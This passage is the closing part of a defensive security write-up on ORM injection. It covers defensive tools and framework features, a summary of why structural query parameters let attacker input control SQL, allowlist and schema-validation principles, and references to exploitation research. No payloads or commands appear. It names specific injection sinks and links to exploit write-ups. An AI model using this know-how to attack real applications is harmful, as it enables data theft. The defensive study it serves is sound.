| **Nuclei** (DAST) | Web applications | Template-based scanning for known ORM injection CVE patterns |

### ORM-Specific Defenses

| Tool / Feature | Framework | Mechanism |
|---|---|---|
| **django-filter** | Django | Restricts filterable fields via explicit `filterset_fields` declaration |
| **Ransack 4.0+** | Rails | Requires explicit `ransackable_attributes` / `ransackable_associations` allowlists |
| **Sequelize `operatorsAliases: false`** | Sequelize | Disables string-based operators, requiring Symbol-based `Op.*` |
| **Prisma Client Extensions** | Prisma | Middleware for input validation before query execution |

---

## Summary: Core Principles

**The fundamental property that makes ORM injection possible is the impedance mismatch between two security models.** SQL's security model is based on parameterized values — the query structure is fixed at compile time, and user input fills only value placeholders. ORMs, by design, make query structure dynamic — field names, operators, join paths, sort columns, and logical connectors are all programmatically configurable. When user input reaches any structural parameter of the ORM's query API, the application has effectively given the attacker control over the SQL structure that parameterization was designed to fix.

**Incremental patches fail because the attack surface is inherent to the ORM abstraction.** Each CVE addresses a specific injection sink — `extra()` is deprecated, `_connector` is validated, string operators are replaced with Symbols — but the underlying pattern persists: ORMs must expose structural query parameters to be useful, and developers will pass user input to these parameters. The 2024-2025 CVE trend shows injection points moving from obvious raw SQL methods to increasingly subtle structural parameters (JSON field keys, FilteredRelation aliases, protocol-level message boundaries), demonstrating that the attack surface evolves faster than patch coverage.

**The structural solution requires enforcing the boundary between query structure and query values at the API level.** This means: (1) **Allowlist validation** for all identifiers (column names, table names, sort fields, filter fields) against the model schema — never accept user-controlled strings as identifiers; (2) **Schema validation** for all filter/query parameters against a strict type schema (Zod, Joi, Marshmallow, Strong Parameters) that rejects unexpected object structures; (3) **Explicit opt-in** for queryable fields, relationships, and operators — frameworks like django-filter and Ransack 4.0 that require declaring `filterset_fields` or `ransackable_attributes` represent the right architectural direction; (4) **Input size limits** to defend against protocol-level attacks. The goal is not to make the ORM "injection-proof" but to reduce the API surface that accepts structural parameters from the internet to zero.

---

## References

- PayloadsAllTheThings — ORM Leak (https://swisskyrepo.github.io/PayloadsAllTheThings/ORM%20Leak/)
- "plORMbing your Django ORM" — elttam (https://www.elttam.com/blog/plormbing-your-django-orm/)
- "ORM Leaking More Than You Joined For" — elttam (https://www.elttam.com/blog/leaking-more-than-you-joined-for/)
- "plORMbing your Prisma ORM with Time-based Attacks" — elttam (https://www.elttam.com/blog/plorming-your-primsa-orm/)
- "Exploiting a Ransack Query Injection" — Vaadata (https://www.vaadata.com/blog/ransack-query-injection-analysis-and-exploitation-of-an-orm-vulnerability/)
- "Ransacking your password reset tokens" — Positive Security (https://positive.security/blog/ransack-data-exfiltration)
- "New Methods for Exploiting ORM Injections in Java Applications" — Egorov & Soldatov, HITB 2016 (https://insinuator.net/2016/06/new-methods-for-exploiting-orm-injections-in-java-applications-hitb16/)
- "Exploiting Hibernate Injections" — SonarSource (https://www.sonarsource.com/blog/exploiting-hibernate-injections/)
- "SQL Injection Isn't Dead: Smuggling Queries at the Protocol Level" — Paul Gerste, DEF CON 32 (https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/)
- "DQL Injection" — Deteact (https://blog.deteact.com/dql-injection/)
- Rails SQL Injection Examples (https://rails-sqli.org/)
- Django Security Advisories (https://www.djangoproject.com/weblog/)
- Sequelize Security Advisories (https://github.com/sequelize/sequelize/security)
- TypeORM Security Advisories (https://github.com/typeorm/typeorm/security)
- "SQL Injection in ORMs 2025" — Propel (https://www.propelcode.ai/blog/sql-injection-orm-vulnerabilities-modern-frameworks-2025)
- "Preventing SQL Injection in Django" — Jacob Kaplan-Moss (https://jacobian.org/2020/may/15/preventing-sqli/)
- Doctrine ORM Security Documentation (https://www.doctrine-project.org/projects/doctrine-orm/en/3.2/reference/security.html)
- Entity Framework Core SQL Queries Security (https://learn.microsoft.com/en-us/ef/core/querying/sql-queries)
- GORM Security Documentation (https://gorm.io/docs/security.html)
- OWASP Laravel Cheat Sheet (https://cheatsheetseries.owasp.org/cheatsheets/Laravel_Cheat_Sheet.html)

---

*This document was created for defensive security research and vulnerability understanding purposes.*
